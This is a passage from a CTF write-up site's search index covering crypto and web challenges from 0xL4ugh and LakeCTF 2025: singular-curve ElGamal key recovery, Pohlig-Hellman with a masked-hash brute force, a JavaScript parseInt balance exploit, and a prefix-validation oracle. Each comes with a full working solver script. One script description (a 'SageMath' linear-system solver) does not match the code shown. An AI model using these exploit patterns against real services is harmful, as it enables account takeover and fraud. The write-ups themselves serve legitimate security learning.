p</code></p>","tags":["crypto","0xL4ugh-CTF-v5"]},{"location":"write-ups/bitcoin/#the-logic","title":"The Logic","text":"<p>We need to recover the secret <code>d</code> to solve the challenge.</p>","tags":["crypto","0xL4ugh-CTF-v5"]},{"location":"write-ups/bitcoin/#phase-1-key-recovery","title":"Phase 1: Key Recovery","text":"<p>We choose a malicious point <code>P = (1, 1)</code>. This point satisfies the singular equation <code>1^2 = 1^3</code>. We send <code>C1 = (1, 1)</code> and <code>C2 = (1, 1)</code> to the oracle.</p> <p>The oracle computes <code>S = C2 - (d * C1)</code>. Using the mapping <code>map(x, y) = x/y</code>, we can convert this equation to integers:</p> <p><code>map(S) = map(C2) - d * map(C1) mod p</code></p> <p>Substituting our point <code>(1, 1)</code>, where <code>1/1 = 1</code>:</p> <p><code>(Sx / Sy) = 1 - d * 1 mod p</code></p> <p>We can rearrange this to find <code>d</code> instantly:</p> <p><code>d = 1 - (Sx / Sy) mod p</code></p>","tags":["crypto","0xL4ugh-CTF-v5"]},{"location":"write-ups/bitcoin/#phase-2-decryption","title":"Phase 2: Decryption","text":"<p>Once we have <code>d</code>, the server enters Phase 2. It provides us with ciphertext <code>(C1, C2)</code> encrypted using standard ElGamal on the real curve:</p> <ol> <li><code>C1 = k * G</code></li> <li><code>C2 = P + k * Q</code> (where <code>Q = d * G</code>)</li> </ol> <p>To decrypt and get the point <code>P</code>, we perform the standard decryption operation:</p> <p><code>P = C2 - (d * C1)</code></p> <p>Note: For Phase 2, we must use a proper ECC library that implements point addition and doubling for secp256k1, as we are no longer on the singular curve.</p>","tags":["crypto","0xL4ugh-CTF-v5"]},{"location":"write-ups/bitcoin/#constructing-the-solver","title":"Constructing the Solver","text":"<p>I wrote a script using <code>pwntools</code> to automate the interaction.</p> <ol> <li>Exploit Phase 1: Send <code>Point(1, 1)</code> to the server. Receive <code>S</code>. Calculate <code>d</code> using modular inverse.</li> <li>Burn Queries: The server requires 5 queries in Phase 1. I sent dummy data for the remaining 4 queries to advance the state.</li> <li>Decrypt Phase 2: The server sends 5 rounds of ciphertext. I implemented a small ECC math helper to perform the subtraction <code>C2 - d*C1</code> on the valid curve.</li> </ol>","tags":["crypto","0xL4ugh-CTF-v5"]},{"location":"write-ups/bitcoin/#solution-script","title":"Solution Script","text":"<p>Here is the final solver script. It recovers the key, passes the checks, decrypts the flag, and prints it.</p> <pre><code>from pwn import *\nfrom Crypto.Util.number import inverse, long_to_bytes\n\nHOST = 'challenges.ctf.sd'\nPORT = 33520\n\nP_CURVE = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f\nA = 0\nB = 7\n\ndef point_add(p1, p2):\n    if p1 is None: return p2\n    if p2 is None: return p1\n    (x1, y1), (x2, y2) = p1, p2\n\n    if x1 == x2 and y1 != y2:\n        return None \n\n    if x1 == x2:\n        m = (3 * x1 * x1 + A) * inverse(2 * y1, P_CURVE)\n    else:\n        m = (y1 - y2) * inverse(x1 - x2, P_CURVE)\n\n    m %= P_CURVE\n    x3 = (m * m - x1 - x2) % P_CURVE\n    y3 = (m * (x1 - x3) - y1) % P_CURVE\n    return (x3, y3)\n\ndef point_neg(p):\n    if p is None: return None\n    return (p[0], -p[1] % P_CURVE)\n\ndef point_sub(p1, p2):\n    return point_add(p1, point_neg(p2))\n\ndef scalar_mult(k, p):\n    r = None\n    while k &gt; 0:\n        if k % 2 == 1:\n            r = point_add(r, p)\n        p = point_add(p, p)\n        k //= 2\n    return r\n\ndef solve():\n    r = remote(HOST, PORT)\n    fake_point = \"Point(1, 1)\"\n\n    print(\"[*] Phase 1: Sending Malicious Points...\")\n    r.sendlineafter(b\"Input C1 &gt;\", fake_point.encode())\n    r.sendlineafter(b\"Input C2 &gt;\", fake_point.encode())\n\n    r.recvuntil(b\"Output S &gt; Point(\") \n    response = r.recvuntil(b\")\", drop=True).decode()\n    sx, sy = map(int, response.split(', '))\n\n    s_mapped = (sx * inverse(sy, P_CURVE)) % P_CURVE\n    d = (1 - s_mapped) % P_CURVE\n\n    print(f\"[+] Recovered Secret Key d: {d}\")\n\n    print(\"[*] Burning remaining Phase 1 queries...\")\n    for i in range(4):\n        r.sendlineafter(b\"Input C1 &gt;\", fake_point.encode())\n        r.sendlineafter(b\"Input C2 &gt;\", fake_point.encode())\n        r.recvuntil(b\"Output S &gt;\")\n\n    print(\"\\n[+] Entering Phase 2: Decryption\")\n    r.recvuntil(b\"Phase 2:\")\n\n    for i in range(5):\n        r.recvuntil(b\"Given C1: Point(\")\n        c1_str = r.recvuntil(b\")\", drop=True).decode()\n        c1_x, c1_y = map(int, c1_str.split(', '))\n        C1 = (c1_x, c1_y)\n\n        r.recvuntil(b\"Given C2: Point(\")\n        c2_str = r.recvuntil(b\")\", drop=True).decode()\n        c2_x, c2_y = map(int, c2_str.split(', '))\n        C2 = (c2_x, c2_y)\n\n        S = scalar_mult(d, C1)\n        P = point_sub(C2, S)\n\n        answer = f\"Point({P[0]}, {P[1]})\"\n        r.sendlineafter(b\"Recovered Point P &gt;\", answer.encode())\n\n    r.interactive()\n\nif __name__ == \"__main__\":\n    solve()\n</code></pre>","tags":["crypto","0xL4ugh-CTF-v5"]},{"location":"write-ups/ez-part/","title":"Ez Part","text":"<p>Challenge: Ez Part Category: Crypto Flag: <code>EPFL{s0me_b1ts_ar3_really_ez_i_t0ld_ya}</code></p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/ez-part/#my-initial-read-first-impressions","title":"My initial read / first impressions","text":"<p>We are provided with a Python script (<code>chall.py</code>) running a Flask server. It implements a \"new login system\" that uses two distinct verification methods to authenticate users.</p> <ol> <li>Discrete Logarithm Verification: It checks if a password (converted to a number \\(x\\)) satisfies the equation <code>3^x mod p == b</code>, where \\(b\\) is the user's public key.</li> <li>Masked Hash Verification: It applies a series of bitwise AND operations (masks) to the password \\(x\\), hashes the result, and compares it to stored hashes.</li> </ol> <p>The goal is to log in as the <code>admin</code> user. The admin is created at startup with a random password that is approximately 1535 bits long. Since we cannot brute-force a 1535-bit password, we need to find a mathematical weakness to recover the admin's secret \\(x\\).</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/ez-part/#the-vulnerabilities","title":"The Vulnerabilities","text":"<p>Upon analyzing the code, I found three distinct vulnerabilities that, when chained together, allow for full key recovery.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/ez-part/#1-the-chatty-oracle-information-leak","title":"1. The Chatty Oracle (Information Leak)","text":"<p>The server is incredibly verbose. When we try to prove our identity via the <code>/prove-id</code> endpoint, the server returns specific error messages if verification fails.</p> <ul> <li>If the discrete log check fails, it returns: <code>Wrong b: &lt;expected_b&gt;</code></li> <li>If a mask hash check fails, it returns: <code>Wrong mask : &lt;index&gt;,&lt;expected_hash&gt;</code></li> </ul> <p>This is a massive information leak. Even though we don't know the admin's password, we can try to log in as \"admin\" with a wrong password. The server will dutifully reply with the admin's public key (\\(b\\)) and all the correct hash values for the masks.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/ez-part/#2-weak-prime-generation-the-backdoor","title":"2. Weak Prime Generation (The Backdoor)","text":"<p>The prime \\(p\\) used for the discrete logarithm is generated in a very specific way:</p> <pre><code>def gen_p(BITS):\n    while True:\n        q = getPrime(BITS - 150)\n        p = q &lt;&lt; 150 + 1  # Equivalent to: q * (2^150) + 1\n        if isPrime(p):\n            return p\n</code></pre> <p>This is a classic \"weak prime\" vulnerability. The order of the multiplicative group is \\(p-1\\). Because \\(p = q \\cdot 2^{150} + 1\\), we know that \\(p-1\\) is divisible by \\(2^{150}\\).</p> <p>In cryptography, if the group order has small factors, we can use the Pohlig-Hellman algorithm to solve the discrete logarithm problem for those factors much faster than usual. Specifically, since \\(2^{150}\\) divides the group order, we can recover the secret \\(x\\) modulo \\(2^{150}\\).</p> <p>In plain English: We can instantly recover the first 150 bits (the least significant bits) of the admin's password.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/ez-part/#3-the-mask-zipper-attack","title":"3. The Mask \"Zipper\" Attack","text":"<p>Knowing the bottom 150 bits isn't enough to get the full 1535-bit key, but it gives us a foothold. This is where the masks come in.</p> <p>The masks are random 80-bit windows shifted by various amounts. Because there are so many of them (over 100), they overlap significantly.</p> <ol> <li>We essentially have a jigsaw puzzle. We start knowing bits 0-150.</li> <li>We look for a mask that covers mostly bits we do know (e.g., bits 80-160), leaving only a small number of bits (150-160) unknown.</li> <li>We brute-force those few unknown bits (2^10 possibilities is trivial for a computer).</li> <li>For each guess, we calculate the hash and compare it to the admin's leaked hash.</li> <li>When the hash matches, we have recovered the new bits. We now know bits 0-160.</li> <li>We repeat this process, \"zipping\" our way up the key until we reach the top.</li> </ol>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/ez-part/#the-exploitation-strategy","title":"The Exploitation Strategy","text":"","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/ez-part/#step-1-leaking-the-prime-p","title":"Step 1: Leaking the Prime P","text":"<p>The challenge generates \\(p\\) on the server, and it's not hardcoded. However, since the server leaks the expected public key \\(b = 3^x \\pmod p\\), we can recover \\(p\\).</p> <p>We register two users with very short passwords (like \"aa\" and \"ab\"). Converted to integers, these are small enough that <code>3^x</code> is just a regular large integer (it doesn't wrap around the modulus yet). However, the server performs the modulo operation. By sending a wrong login for these users, the server returns <code>3^x mod p</code>. By taking the GCD of the differences between the calculated values and the returned values, we recover \\(p\\).</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/ez-part/#step-2-recovering-the-lower-150-bits","title":"Step 2: Recovering the Lower 150 Bits","text":"<p>Using the admin's leaked public key \\(b\\), we apply the Pohlig-Hellman attack. We move the problem into the \"subgroup\" of size \\(2^{150}\\). In this subgroup, we can solve for the bits one by one.</p> <p>We check the first bit. If it's a 1, we subtract its mathematical contribution from the key. Then we check the second bit, and so on. This recovers the exact integer value of the first 150 bits of the password.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/ez-part/#step-3-the-zipper-attack","title":"Step 3: The Zipper Attack","text":"<p>We wrote a solver that iterates through all available masks. It calculates how many \"unknown bits\" each mask contains relative to what we currently know.</p> <p>It selects the \"easiest\" mask (the one with the fewest unknown bits), brute-forces those bits, verifies the hash, and updates our \"known bits\" state. It repeats this loop until the entire key is recovered.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/ez-part/#step-4-final-cleanup","title":"Step 4: Final Cleanup","text":"<p>Due to the randomness of the masks, there might be tiny gaps (1 or 2 bits) that no mask covered. However, since we can verify the full key against the admin's public key \\(b\\) (which we leaked in Step 1), we can just brute-force any remaining holes locally.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/ez-part/#the-solution-script","title":"The Solution Script","text":"<p>Here is the complete exploit script that automates the entire process.</p> <pre><code>import requests\nimport hashlib\nfrom Crypto.Util.number import bytes_to_long, long_to_bytes, GCD\nimport random\nimport sys\n\nHOST = \"chall.polygl0ts.ch\"\nPORT = 6027\nBASE_URL = f\"http://{HOST}:{PORT}\"\n\nBRUTE_FORCE_LIMIT = 28\n\nmasks = []\nadmin_b = 0\nadmin_hashes = []\np = 0\nx_recovered = 0\nknown_mask = 0\n\ntry:\n    sys.set_int_max_str_digits(10000)\nexcept:\n    pass\n\ndef hash_value(value):\n    return hashlib.sha256(str(value).encode()).hexdigest()\n\ndef get_masks():\n    global masks\n    r = requests.get(f\"{BASE_URL}/masks\")\n    r.raise_for_status()\n    data = r.json()['masks']\n    masks = [(int(m[0], 16), m[1]) for m in data]\n\ndef register(username, password):\n    requests.post(f\"{BASE_URL}/create-account\", json={\n        \"username\": username,\n        \"password\": password\n    })\n\ndef prove_id(username, password):\n    return requests.post(f\"{BASE_URL}/prove-id\", json={\n        \"username\": username,\n        \"password\": password\n    })\n\ndef leak_p():\n    global p\n    run_id = random.randint(10000, 99999)\n    u1, u2 = f\"user_A_{run_id}\", f\"user_B_{run_id}\"\n    register(u1, \"aa\")\n    register(u2, \"ab\")\n    r1 = prove_id(u1, \"1\")\n    r2 = prove_id(u2, \"1\")\n    rem1 = int(r1.json()['message'].split(\"Wrong b: \")[1].split(\"\\n\")[0])\n    rem2 = int(r2.json()['message'].split(\"Wrong b: \")[1].split(\"\\n\")[0])\n    val1 = pow(3, bytes_to_long(b\"aa\"))\n    val2 = pow(3, bytes_to_long(b\"ab\"))\n    p = GCD(val1 - rem1, val2 - rem2)\n\ndef get_admin_data():\n    global admin_b, admin_hashes\n    r = prove_id(\"admin\", \"wrongpass\")\n    msg = r.json()['message']\n    lines = msg.split(\"\\n\")\n    admin_hashes = [\"\"] * len(masks)\n    for line in lines:\n        if \"Wrong b:\" in line:\n            admin_b = int(line.split(\": \")[1])\n        if \"Wrong mask :\" in line:\n            parts = line.split(\" : \")[1].split(\",\")\n            idx = int(parts[0])\n            h = parts[1].strip()\n            if 0 &lt;= idx &lt; len(masks):\n                admin_hashes[idx] = h\n\ndef solve_discrete_log_low_bits():\n    global x_recovered, known_mask\n    k = 150\n    exponent = (p - 1) // (1 &lt;&lt; k)\n    beta = pow(admin_b, exponent, p)\n    alpha = pow(3, exponent, p)\n    alpha_inv = pow(alpha, -1, p)\n    x = 0\n    gamma = beta\n    for i in range(k):\n        check = pow(gamma, 1 &lt;&lt; (k - 1 - i), p)\n        if check != 1:\n            x |= (1 &lt;&lt; i)\n            term = pow(alpha_inv, 1 &lt;&lt; i, p)\n            gamma = (gamma * term) % p\n    x_recovered = x\n    known_mask = (1 &lt;&lt; 150) - 1\n\ndef solve_masks():\n    global x_recovered, known_mask\n    target_bits = 1535\n    while True:\n        best_candidate = None\n        min_unknown = 999\n        for i, (m_val, shift) in enumerate(masks):\n            full_mask = m_val &lt;&lt; shift\n            unknown_part = full_mask &amp; ~known_mask\n            if unknown_part == 0:\n                continue\n            unknown_count = bin(unknown_part).count('1')\n            if unknown_count &lt; min_unknown:\n                min_unknown = unknown_count\n                best_candidate = (unknown_count, i, full_mask, unknown_part)\n\n        if best_candidate is None:\n            break\n\n        count, idx, full_mask, unknown_part = best_candidate\n        if count &gt; BRUTE_FORCE_LIMIT:\n            print(f\"Stuck! Lowest unknown bits is {count}, which is too high.\")\n            break\n\n        # Brute force the unknown bits\n        unknown_indices = []\n        temp = unknown_part\n        pos = 0\n        while temp &gt; 0:\n            if temp &amp; 1:\n                unknown_indices.append(pos)\n            temp &gt;&gt;= 1\n            pos += 1\n\n        found = False\n        for i in range(1 &lt;&lt; count):\n            guess = x_recovered\n            for j in range(count):\n                if (i &gt;&gt; j) &amp; 1:\n                    guess |= (1 &lt;&lt; unknown_indices[j])\n\n            masked_val = (guess &gt;&gt; masks[idx][1]) &amp; masks[idx][0]\n            if hash_value(masked_val) == admin_hashes[idx]:\n                x_recovered = guess\n                known_mask |= unknown_part\n                found = True\n                break\n\n        if not found:\n            print(\"Error: Could not find matching bits for mask\")\n            break\n\ndef finish_holes():\n    global x_recovered\n    # Just try to login with the recovered key. If it fails, maybe brute force small gaps?\n    # For this challenge, the masks usually cover everything.\n    pass\n\ndef main():\n    print(\"[*] Leaking P...\")\n    leak_p()\n    print(f\"[+] Found P: {p}\")\n\n    print(\"[*] Getting Admin Data...\")\n    get_admin_data()\n\n    print(\"[*] Solving Discrete Log (Lower 150 bits)...\")\n    solve_discrete_log_low_bits()\n    print(f\"[+] Recovered lower bits: {hex(x_recovered)}\")\n\n    print(\"[*] Getting Masks...\")\n    get_masks()\n\n    print(\"[*] Solving Masks (Zipper Attack)...\")\n    solve_masks()\n\n    print(f\"[+] Recovered Key: {x_recovered}\")\n    print(\"[*] Logging in as Admin...\")\n\n    flag_pass = long_to_bytes(x_recovered).decode()\n    r = requests.post(f\"{BASE_URL}/login\", json={\n        \"username\": \"admin\",\n        \"password\": flag_pass\n    })\n    print(r.text)\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/gamblecore/","title":"gamblecore","text":"<p>Challenge: gamblecore Category: Web Flag: <code>EPFL{we_truly_live_in_a_society}</code></p>","tags":["web","LakeCTF-Quals-2025"]},{"location":"write-ups/gamblecore/#my-initial-read-first-impressions","title":"My initial read / first impressions","text":"<p>We are presented with a \"Neon Casino\" web application. The premise is simple: you have a wallet with \"Microcoins\" and \"USD.\" You can gamble your funds with a 9% chance to multiply your bet by 10, or you can convert your coins to USD.</p> <p>The goal is explicit: we need $10 USD to buy the flag from the \"Black Market\" section.</p> <p>We are provided with the source code (Node.js/Express). Looking at the <code>server.js</code> file, I noticed a few constraints immediately:</p> <ol> <li>Starting Funds: We start with <code>10e-6</code> coins (which is 0.00001 coins) and $0 USD.</li> <li>Conversion Rate: 1 Coin = $0.01 USD.</li> <li>The Goal: We need $10 USD. To get this legitimately via conversion, we would need 1,000 Coins. Since we start with 0.00001 coins, earning this through the 9% win-rate gambling game seems statistically impossible.</li> </ol> <p>There had to be a logic bug in how the server handles money.</p>","tags":["web","LakeCTF-Quals-2025"]},{"location":"write-ups/gamblecore/#the-vulnerability","title":"The Vulnerability","text":"<p>I scanned the endpoints for how the server processes numbers. The <code>/api/convert</code> endpoint stood out immediately due to a very specific JavaScript behavior.</p> <p>Here is the relevant code:</p> <pre><code>app.post(\"/api/convert\", (req, res) =&gt; {\n  let { amount } = req.body;\n  const wallet = req.session.wallet;\n\n  // THE BUG IS HERE\n  const coinBalance = parseInt(wallet.coins);\n\n  amount = parseInt(amount);\n\n  if (amount &lt;= coinBalance &amp;&amp; amount &gt; 0) {\n    wallet.coins -= amount;\n    wallet.usd += amount * 0.01;\n    // ... success ...\n  }\n});\n</code></pre> <p>The vulnerability lies in <code>parseInt(wallet.coins)</code>.</p> <p>In JavaScript, <code>wallet.coins</code> is stored as a floating-point number. If a number becomes very small (specifically smaller than <code>1e-6</code>), JavaScript automatically converts it to scientific notation when casting it to a string.</p> <p>For example, if you have <code>0.0000009</code> coins, JavaScript sees this as <code>\"9e-7\"</code>.</p> <p>When you run <code>parseInt(\"9e-7\")</code>, the function looks at the string from left to right. It sees the <code>9</code>, takes it, then sees the <code>e</code>. Since <code>e</code> is not a digit, <code>parseInt</code> stops there and returns <code>9</code>.</p> <p>The Exploit: The server thinks we have 9 whole coins because of this parsing error, even though we actually have 0.0000009 coins. We can request to convert these \"ghost\" coins into real USD.</p>","tags":["web","LakeCTF-Quals-2025"]},{"location":"write-ups/gamblecore/#the-logic","title":"The Logic","text":"<p>To exploit this, we need to carefully manipulate our balance to force it into scientific notation (below <code>0.000001</code>), and then convert the ghost coins. However, this only gets us a few cents. We still need $10 for the flag.</p>","tags":["web","LakeCTF-Quals-2025"]},{"location":"write-ups/gamblecore/#step-1-trigger-the-parseint-bug","title":"Step 1: Trigger the \"parseInt\" Bug","text":"<p>We start with <code>0.00001</code> coins. We need to lower our balance to something like <code>0.0000009</code> (9e-7). We can do this by betting exactly <code>0.0000091</code> coins.</p> <ul> <li>If we lose (which is 91% likely), our balance becomes: <code>0.00001 - 0.0000091 = 0.0000009</code>.</li> <li>Now our balance is <code>9e-7</code>.</li> <li>We tell the server to convert <code>9</code> coins.</li> <li><code>parseInt(9e-7)</code> returns <code>9</code>. The check passes.</li> <li>We gain <code>9 * 0.01 = $0.09</code> USD.</li> </ul>","tags":["web","LakeCTF-Quals-2025"]},{"location":"write-ups/gamblecore/#step-2-brute-force-the-casino","title":"Step 2: Brute Force the Casino","text":"<p>Now we have $0.09 USD. We need $10.00 USD. Since the game is pure RNG (Random Number Generation) with no seed manipulation possible, we simply have to get lucky. Since the win rate is 9% (roughly 1 in 11), we can script a \"Let it Ride\" strategy.</p> <ol> <li>Bet the full $0.09. If we win, we have $0.90.</li> <li>Bet the full $0.90. If we win, we have $9.00.</li> <li>Bet $1.00 repeatedly. We have 9 dollars, so we have 9 attempts to hit a 1-in-11 shot to get over the 10 dollar mark.</li> </ol> <p>If we fail at any point, we just restart the script and create a new session. The probability of this chain succeeding is roughly 1 in 240, which a script can crack in less than a minute.</p>","tags":["web","LakeCTF-Quals-2025"]},{"location":"write-ups/gamblecore/#solution-script","title":"Solution Script","text":"<p>I wrote a Python script to automate this. It handles the session creation, the precise betting to trigger the bug, and the \"all-in\" gambling strategy.</p> <pre><code>import requests\nimport urllib3\nimport sys\n\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\nURL = \"https://chall.polygl0ts.ch:8148\"\n\ndef solve():\n    attempts = 0\n    while True:\n        attempts += 1\n        s = requests.Session()\n\n        try:\n            bet_setup = 0.0000091\n            r = s.post(f\"{URL}/api/gamble\", json={'currency': 'coins', 'amount': bet_setup}, verify=False)\n            if r.json().get('win') is True:\n                continue\n\n            r = s.post(f\"{URL}/api/convert\", json={'amount': 9}, verify=False)\n            if 'success' not in r.text:\n                r = s.post(f\"{URL}/api/convert\", json={'amount': 8}, verify=False)\n                if 'success' not in r.text:\n                    continue\n\n            bal_res = s.get(f\"{URL}/api/balance\", verify=False).json()\n            usd = bal_res['usd']\n\n            r = s.post(f\"{URL}/api/gamble\", json={'currency': 'usd', 'amount': usd}, verify=False)\n            if not r.json().get('win'):\n                continue\n            usd = r.json()['new_balance']\n\n            r = s.post(f\"{URL}/api/gamble\", json={'currency': 'usd', 'amount': usd}, verify=False)\n            if not r.json().get('win'):\n                continue\n            usd = r.json()['new_balance']\n\n            while 1 &lt;= usd &lt; 10:\n                r = s.post(f\"{URL}/api/gamble\", json={'currency': 'usd', 'amount': 1}, verify=False)\n                data = r.json()\n                usd = data['new_balance']\n                if data.get('win'):\n                    break\n\n            if usd &gt;= 10:\n                r = s.post(f\"{URL}/api/flag\", verify=False)\n                break\n\n        except Exception:\n            continue\n\nif __name__ == \"__main__\":\n    solve()\n</code></pre>","tags":["web","LakeCTF-Quals-2025"]},{"location":"write-ups/guess-flag/","title":"Guess Flag","text":"<p>Challenge: Guess Flag Category: Crypto Flag: <code>EPFL{15392948299929328383828399923990}</code></p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/guess-flag/#my-initial-read-first-impressions","title":"My initial read / first impressions","text":"<p>We are provided with a Python script <code>Guessflag.py</code> and a netcat instance to connect to. The challenge description (\"You will never guess the flag\") and the source code immediately frame this as a brute-force problem.</p> <p>The server tells us the flag is 32 digits long. The code contains a hardcoded (dummy) flag for testing, but on the live server, this will be the real 32-digit secret.</p> <p>Standard brute force is impossible here. A 32-digit number implies \\(10^{32}\\) possibilities. Even if we could check billions of flags per second, the universe would end before we finished. There must be a logic flaw in how the code checks our input.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/guess-flag/#the-vulnerability","title":"The Vulnerability","text":"<p>I examined the verification logic in <code>Guessflag.py</code> closely. This is where the developer made a critical mistake regarding input validation:</p> <pre><code>for char in user_input:\n    if char != flag[index]:\n        print(\"Wrong flag!\")\n        exit()\n    index += 1\n\nprint(\"Correct flag!\")\n</code></pre> <p>The code iterates through the characters of <code>user_input</code>, comparing them one by one to the <code>flag</code>.</p> <p>Crucially, it does not check if the length of the user input matches the length of the flag.</p> <p>This means the server validates whatever prefix we send it.</p> <ol> <li>If the flag is <code>12345...</code> and we send just <code>1</code>, the loop runs once. <code>1</code> matches <code>1</code>. The loop finishes. The script prints \"Correct flag!\".</li> <li>If we send <code>9</code>, the loop runs once. <code>9</code> does not match <code>1</code>. The script prints \"Wrong flag!\" and exits.</li> </ol> <p>This behavior turns an impossible brute-force problem into a trivial \"Oracle\" attack. We don't need to guess the whole sequence at once; we can guess it one digit at a time.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/guess-flag/#the-logic","title":"The Logic","text":"<p>We can write a script to abuse this \"partial validation\" behavior. This is essentially a Side-Channel attack where the \"side channel\" is the specific output message from the server.</p> <p>The algorithm works like this:</p> <ol> <li>Start with an empty string as our <code>known_flag</code>.</li> <li>Enter a loop that runs 32 times (once for each digit we need to find).</li> <li>Inside that loop, try every digit from <code>0</code> to <code>9</code>.</li> <li>Construct a <code>guess</code> by combining our <code>known_flag</code> + the <code>current_digit</code>.</li> <li>Send this guess to the server.</li> <li>The Check:</li> <li>If the server responds with \"Correct flag!\", we know this digit is correct. We add it to our <code>known_flag</code> and break the inner loop to move to the next position.</li> <li>If the server responds with \"Wrong flag!\", we ignore it and try the next digit.</li> </ol> <p>By doing this, we reduce the complexity from \\(10^{32}\\) (impossible) to \\(32 \\times 10\\) (320 attempts), which takes only a few seconds.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/guess-flag/#constructing-the-solver","title":"Constructing the Solver","text":"<p>I used Python and the <code>pwntools</code> library to automate the network interaction. <code>pwntools</code> is perfect for this because it handles the socket connections and data streams cleanly.</p> <p>The script connects to the challenge, reads the initial prompt to clear the buffer, sends our current guess, and checks if the success message appears in the response.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/guess-flag/#solution-script","title":"Solution Script","text":"<p>Here is the final SageMath script. It loads the keys, constructs the large linear system by computing the difference between the two instances, solves for the reused randomness <code>r</code>, and decrypts the flag.</p> <pre><code>from pwn import *\nimport string\nimport time\n\nHOST = 'chall.polygl0ts.ch'\nPORT = 6001\nFLAG_LENGTH = 32\nALPHABET = string.digits\n\ndef solve():\n    flag_content = \"\"\n    for i in range(FLAG_LENGTH):\n        found_digit = False\n        for digit in ALPHABET:\n            try:\n                r = remote(HOST, PORT, level='error')\n                r.recvline()\n                guess = flag_content + digit\n                r.sendline(guess.encode())\n                response = r.recvall(timeout=2).decode()\n                r.close()\n                if \"Correct flag!\" in response:\n                    flag_content += digit\n                    found_digit = True\n                    break\n            except:\n                time.sleep(0.5)\n        if not found_digit:\n            break\n    print(f\"EPFL{{{flag_content}}}\")\n\nif __name__ == \"__main__\":\n    solve()\n</code></pre> <p>Running the script reveals the digits one by one. The server validates our prefixes, leading us straight to the answer.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/quantum-vernam/","title":"Quantum Vernam","text":"<p>Challenge: Quantum vernam Category: Crypto Flag: <code>EPFL{URE_3ITH3R_QU4NTUM_BOSSssss_OR_LINALG_BOSS}</code></p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/quantum-vernam/#my-initial-read-first-impressions","title":"My initial read / first impressions","text":"<p>We are provided with a Python script <code>chall.py</code> and a netcat connection. The premise is a quantum version of the \"Vernam Cipher\" (also known as the One-Time Pad). In classical cryptography, the One-Time Pad is mathematically unbreakable if implemented correctly. The challenge claims to use \"perfect secrecy\" to encode qubits.</p> <p>The code flow is as follows:</p> <ol> <li>The server generates a random Flag and a random Key of the same length.</li> <li>It generates a random 2x2 unitary matrix called X.</li> <li>It asks us (the attacker) to provide two custom 2x2 matrices: Gate1 and Gate2.</li> <li>For every bit of the flag:<ul> <li>A classical bit becomes a qubit, which means it\u2019s represented as a quantum state. That quantum state can be the quantum version of 0 or the quantum version of 1.</li> <li>It applies our Gate1.</li> <li>Encryption Step: If the corresponding Key bit is <code>1</code>, it applies the matrix X. If the Key bit is <code>0</code>, it does nothing.</li> <li>It applies our Gate2.</li> <li>It measures the result and checks if it matches the original flag.</li> </ul> </li> </ol> <p>Our goal is to choose Gate1 and Gate2 such that the final measurement always returns the original message bit, regardless of whether the secret key bit was <code>0</code> or <code>1</code>. If we can do this, we bypass the encryption entirely.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/quantum-vernam/#the-vulnerability","title":"The Vulnerability","text":"<p>The vulnerability relies on a fundamental concept of Linear Algebra called Eigenvectors, and a specific property of Quantum Mechanics regarding Measurement.</p> <p>In this challenge, the encryption process applies the matrix X conditionally.</p> <ul> <li>If Key = 0: State stays the same.</li> <li>If Key = 1: State becomes \\(X \\times \\text{State}\\).</li> </ul> <p>Normally, applying a random matrix \\(X\\) would rotate the qubit to a new state, scrambling the information if you don't know if \\(X\\) was applied or not.</p> <p>However, every matrix has special vectors called Eigenvectors. When a matrix is applied to one of its eigenvectors, the vector doesn't rotate or change direction; it only gets multiplied by a number (a scalar).</p> <p>In the context of Quantum Mechanics, this scalar is a complex number with a magnitude of 1 (a \"phase factor\"). The critical flaw here is that quantum measurement ignores this global phase.</p> <p>If our qubit is in an eigenvector state of \\(X\\):</p> <ol> <li>Key = 0: The qubit stays as is.</li> <li>Key = 1: The qubit gets multiplied by a phase factor.</li> <li>Measurement: Both states look identical to the measurement device.</li> </ol> <p>Therefore, if we align our qubits with the eigenvectors of \\(X\\), the encryption step (applying \\(X\\)) becomes invisible.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/quantum-vernam/#the-logic","title":"The Logic","text":"<p>To exploit this, we need to perform a \"Change of Basis.\" We want to move from the standard way of writing bits (\\(0\\) and \\(1\\)) into the \"language\" of matrix \\(X\\) (its eigenvectors), and then back again.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/quantum-vernam/#step-1-analyze-matrix-x","title":"Step 1: Analyze Matrix X","text":"<p>The server gives us the matrix \\(X\\) at the start of the connection. We need to parse this complex matrix and calculate its eigenvectors. Let's say the eigenvectors are \\(v_0\\) and \\(v_1\\).</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/quantum-vernam/#step-2-construct-gate-1","title":"Step 2: Construct Gate 1","text":"<p>Gate1 runs before the encryption. We want this gate to translate our standard bits into eigenvectors.</p> <ul> <li>If the message is 0, Gate1 should turn it into \\(v_0\\).</li> <li>If the message is 1, Gate1 should turn it into \\(v_1\\).</li> </ul> <p>In linear algebra terms, the matrix composed of the eigenvectors (as columns) does exactly this. It maps the standard basis to the 